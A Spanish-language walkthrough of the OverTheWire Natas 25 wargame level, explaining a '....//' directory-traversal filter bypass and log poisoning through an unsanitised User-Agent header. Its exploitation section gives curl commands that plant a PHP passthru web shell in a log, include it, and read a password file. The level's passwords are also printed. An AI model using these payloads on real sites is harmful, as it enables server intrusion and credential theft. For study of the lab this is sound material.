# Natas 25 → 26

## Información del nivel

| Campo | Valor |
|---|---|
| URL | http://natas25.natas.labs.overthewire.org |
| Usuario | natas25 |
| Contraseña | ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws |
| Contraseña obtenida | cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE |

---

## Reconocimiento

La página presenta un selector de idioma. El parámetro `lang` carga archivos de idioma locales — vector potencial de LFI.

---

## Análisis del código fuente

### `safeinclude($filename)`

```php
function safeinclude($filename){
    if(strstr($filename,"../")){
        logRequest("Directory traversal attempt! fixing request.");
        $filename=str_replace("../","",$filename);
    }
    if(strstr($filename,"natas_webpass")){
        logRequest("Illegal file access detected! Aborting!");
        exit(-1);
    }
    if (file_exists($filename)) {
        include($filename);
        return 1;
    }
    return 0;
}
```

Tiene dos protecciones:
1. Detecta `../` y lo elimina con `str_replace()`
2. Bloquea paths que contengan `natas_webpass`

### `logRequest($message)`

```php
function logRequest($message){
    $log="[". date("d.m.Y H::i:s",time()) ."]";
    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
    $log=$log . " \"" . $message ."\"\n";
    $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
    fwrite($fd,$log);
    fclose($fd);
}
```

Escribe en el log: fecha, **User-Agent**, y el mensaje. El User-Agent no está sanitizado — vector de inyección.

---

## Vulnerabilidades

### 1. Directory Traversal bypass con `....//`

`str_replace("../", "", $filename)` elimina `../` pero solo una vez. Si se envía `....//`, al eliminar `../` queda `../` de nuevo:

```
....// → str_replace elimina ../ → ../
```

Esto permite salir del directorio `language/` y acceder a archivos arbitrarios del servidor.

### 2. Log Injection + LFI

El User-Agent se escribe en el log sin sanitizar. Si se inyecta código PHP en el User-Agent, ese código queda escrito en el log. Luego se puede incluir el log via LFI — el servidor lo ejecuta como PHP.

La ruta del log es predecible:
```
/var/www/natas/natas25/logs/natas25_<PHPSESSID>.log
```

---

## ¿Qué es LFI (Local File Inclusion)?

Es una vulnerabilidad que permite incluir archivos locales del servidor como si fueran parte del código. En PHP, `include()` ejecuta el archivo incluido — si ese archivo contiene código PHP, se ejecuta.

Diferencia con RFI:
- **LFI** → incluye archivos del mismo servidor
- **RFI** → incluye archivos de un servidor externo

---

## ¿Qué es Log Poisoning?

Es una técnica que consiste en inyectar código malicioso en un archivo de log, y luego incluir ese log via LFI para ejecutar el código. En este nivel:

1. El User-Agent se escribe en el log
2. El log se incluye via LFI
3. El código PHP inyectado se ejecuta en el servidor

---

## Explotación

```bash
# Paso 1: Obtener PHPSESSID
curl -s -c cookies25.txt "http://natas25.natas.labs.overthewire.org/" \
  -u natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws > /dev/null

# Paso 2: Inyectar código PHP en el log via User-Agent
curl -s -b cookies25.txt \
  -A "<?php passthru(\$_GET['cmd']); ?>" \
  "http://natas25.natas.labs.overthewire.org/?lang=en" \
  -u natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws > /dev/null

# Paso 3: Incluir el log via LFI y ejecutar el comando
curl -s -b cookies25.txt \
  "http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_<PHPSESSID>.log&cmd=cat+/etc/natas_webpass/natas26" \
  -u natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
```

La contraseña aparece en el output del log incluido.

---

## Conceptos clave

- **Directory Traversal**: navegar fuera del directorio permitido usando `../`. Se bypasea con `....//` cuando el filtro elimina `../` sin validar recursivamente.
- **LFI (Local File Inclusion)**: incluir archivos locales del servidor via parámetro no sanitizado. Si el archivo contiene PHP, se ejecuta.
- **Log Poisoning**: inyectar código en un log y luego incluirlo via LFI para ejecutarlo.
- **`passthru()`**: función PHP que ejecuta comandos del sistema e imprime el output directamente.
- **User-Agent**: header HTTP que identifica el cliente. Se puede modificar con `-A` en curl.
